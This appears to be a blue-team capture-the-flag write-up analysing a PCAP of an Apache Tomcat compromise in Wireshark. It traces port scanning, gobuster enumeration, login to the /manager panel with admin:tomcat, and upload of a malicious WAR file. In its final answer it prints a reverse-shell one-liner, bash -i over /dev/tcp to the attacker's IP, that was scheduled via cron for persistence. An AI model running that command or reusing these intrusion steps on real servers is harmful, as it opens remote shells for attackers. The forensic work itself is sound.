# Tomcat Takeover - PCAP Analysis (CyberDefenders)


## Scenario
The SOC team has identified suspicious activity on a web server within the company's intranet.
To better understand the situation, they have captured network traffic for analysis.
The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server.
Your task is to analyze the PCAP file to understand the scope of the attack.

## References
- https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/

### Q1 - Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

For this question, I went to `Statistics → Endpoints` and focused on the `TCP` view after first sorting the entries by IP address.
In that view, `14.0.0.120` stood out because it appeared across many different ports, which in the context of the lab strongly suggested scanning activity. 
At the same time, the `10.x.x.x` side could reasonably be treated as the server side of the communication, and that could also be inferred by giving the dataset traffic a quick review and observing how the communication was structured.

<img width="279" height="399" alt="immagine" src="https://github.com/user-attachments/assets/10d36c0f-645f-42a5-b992-f47e140f05e8" />

**Answer:** `14.0.0.120`

### Q2 - Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

I used the DB-IP Free API to identify the answer.

<img width="772" height="177" alt="immagine" src="https://github.com/user-attachments/assets/a67224ad-2266-499b-9fdd-c53a9585bff6" />

**Answer:** `China`

### Q3 - From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

For this question, I filtered the traffic with `frame contains "admin"` to isolate requests related to possible administrative paths.
The **Info** column already showed requests such as `GET /admin` and `GET /admin-console`, and the related traffic was clearly tied to port `8080`. 
In the context of the lab, that was enough to identify `8080` as the port providing access to the web server admin panel.

<img width="877" height="282" alt="immagine" src="https://github.com/user-attachments/assets/bc966e71-ce7b-481b-b846-eb8b8ff0c0b1" />

**Answer:** `8080`

### Q4 - Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

Then I opened one of the HTTP packets already shown in the first screenshot and checked its details. 
The `User-Agent` field was visible there and showed `gobuster/3.6`, which was enough to identify `gobuster` as the enumeration tool.

<img width="362" height="201" alt="immagine" src="https://github.com/user-attachments/assets/2217026a-53a1-423b-81ce-b71921c30445" />

**Answer:** `gobuster`

### Q5 - After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?

For this question, I filtered the traffic with `ip.src == 14.0.0.120 && http` so I could focus only on the attacker’s HTTP activity. 
After the earlier enumeration phase, I expected that any useful administrative path would reappear in the requests once the attacker moved from discovery to actual interaction.
In that filtered HTTP sequence, `/manager` appeared repeatedly and then led into more specific requests such as `/manager/html` and the later authenticated `POST` activity.
That made it clear that `/manager` was the administrative directory the attacker had uncovered, while the surrounding requests confirmed that it was not just an isolated probe but part of the real admin-panel workflow.

<img width="1556" height="1006" alt="immagine" src="https://github.com/user-attachments/assets/7416cf1e-92d8-4c6e-96b4-bcbca635b6b7" />

**Answer:** `/manager`

### Q6 - After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?

Now the focus can move to the lower part of the same screenshot, where the HTTP packet details are visible. 
In that section, the `Authorization` header is present, and Wireshark directly shows the decoded value as `Credentials: admin:tomcat`, which gives the answer.

**Answer:** `admin:tomcat`

### Q7 - Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

At this point, the natural thing to do was to use `Follow HTTP Stream` on the suspicious `POST` request we had already identified.
Once opened, the upload content was much easier to read, and the `filename` field was right there, exposing `JXQOZY.war` directly.

<img width="516" height="289" alt="immagine" src="https://github.com/user-attachments/assets/5afc208b-e1e8-46bb-b685-80e5e2f6cedc" />

**Answer:** `JXQOZY.war`

### Q8 - After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

For this question, I narrowed the scope by thinking about what the prompt was really asking: a command used for both reverse-shell access and persistence. 
Once framed that way, the number of plausible commands became much smaller, because the attacker would likely need something related to scheduled execution rather than just one-off command execution.
For that reason, I filtered the attacker’s traffic with `ip.src == 14.0.0.120 && frame contains "crontab"`, since `crontab` was one of the most natural strings to look for if the goal was to maintain access over time.

<img width="582" height="102" alt="immagine" src="https://github.com/user-attachments/assets/9e70f3c7-f3c3-4571-bb10-b3e48f1a8ed0" />

That search produced two packets, which already suggested that the term had appeared inside a meaningful command sequence rather than by accident.
At that point, I opened one of those packets with `Follow TCP Stream`. 
That was the most useful next step here, because it exposed the full stream content instead of only the single packet, making it possible to read the commands in sequence from the first one to the last one typed by the attacker.
From that stream, the scheduled persistence command could be identified directly as `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`.

<img width="583" height="238" alt="immagine" src="https://github.com/user-attachments/assets/a80c6982-7738-42c5-aecb-202c34302b0b" />

> [!NOTE]
> Since the question was asking about both a reverse shell and persistence, the most plausible hypotheses were commands related to scheduled execution rather than simple one-time command execution.
> The strongest candidates were `cron`, `crontab`, `at`, or direct modifications to files such as `/etc/crontab` or `/var/spool/cron/...`.
> I chose to search for `crontab` first because it was the most natural and specific fit for a persistence mechanism on Linux after doing the necessary background research online.



**Answer:** `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
